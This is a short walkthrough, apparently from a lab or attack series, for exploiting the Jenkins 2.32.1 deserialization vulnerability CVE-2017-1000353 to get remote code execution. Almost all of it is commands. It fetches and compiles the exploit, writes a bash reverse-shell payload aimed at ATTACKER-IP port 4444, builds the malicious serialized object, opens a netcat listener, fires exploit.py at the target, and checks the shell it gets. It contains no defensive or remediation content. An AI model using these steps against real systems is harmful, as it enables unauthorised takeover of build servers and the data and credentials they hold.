
# Attack 4: Exploiting Jenkins 2.32.1 for Remote Code Execution

Jenkins 2.32.1 has a critical Java deserialization vulnerability (CVE-2017-1000353) that allows for remote code execution.

## Step 1: Set Up Exploit Environment

1. Create a directory for the exploit:
   ```bash
   mkdir -p jenkins-exploit && cd jenkins-exploit
   ```

2. Download the exploit code:
   ```bash
   wget https://github.com/vulhub/CVE-2017-1000353/archive/refs/heads/master.zip
   unzip master.zip
   cd CVE-2017-1000353-master
   ```

## Step 2: Prepare the Exploit

1. Install required dependencies:
   ```bash
   # On Debian/Ubuntu
   sudo apt-get install -y openjdk-8-jdk maven
   
   # On RHEL/CentOS/Amazon Linux
   sudo yum install -y java-1.8.0-openjdk-devel maven
   ```

2. Compile the exploit:
   ```bash
   javac -cp "commons-io-2.5.jar:commons-collections-3.2.2.jar:commons-codec-1.9.jar" *.java
   ```

3. Generate a reverse shell payload (replace with your attacker IP and port):
   ```bash
   echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' > payload.sh
   ```

4. Create the malicious serialized object:
   ```bash
   java -cp ".:commons-io-2.5.jar:commons-collections-3.2.2.jar:commons-codec-1.9.jar" Payload payload.sh
   ```
   This creates a file named `payload.ser` containing the serialized object with your payload.

## Step 3: Set Up a Listener on Your Attacking Machine

```bash
nc -lvnp 4444
```

## Step 4: Deliver the Exploit

```bash
python2 exploit.py http://$JENKINS_PRIVATE_IP:8080 payload.ser
```

## Step 5: Verify RCE Success

After sending the exploit, you should receive a reverse shell connection on your listener.
Once connected, verify your access:

```bash
whoami
id
pwd
```
